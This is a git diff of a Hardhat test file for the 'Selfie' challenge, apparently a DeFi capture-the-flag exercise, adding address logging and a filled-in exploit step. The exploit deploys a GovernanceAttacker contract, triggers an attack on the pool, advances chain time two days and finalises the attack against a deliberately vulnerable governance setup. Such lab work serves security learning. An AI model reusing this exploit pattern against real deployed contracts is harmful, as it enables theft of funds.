@@ -22,6 +22,10 @@ describe('[Challenge] Selfie', function () {
             this.governance.address    
         );
 
+        console.log("token address:", this.token.address);
+        console.log("governance address:", this.governance.address);
+        console.log("pool address:", this.pool.address);
+
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
         expect(
@@ -31,6 +35,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let actionId = 0;
+
+        const GovernanceAttacker = await ethers.getContractFactory('GovernanceAttacker', attacker);
+        this.governanceAttacker = await GovernanceAttacker.deploy(
+            this.token.address,
+            this.governance.address,
+            this.pool.address
+        );
+        await this.governanceAttacker.attackRewardPool();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.governanceAttacker.finalAttack();
+
     });
 
     after(async function () {
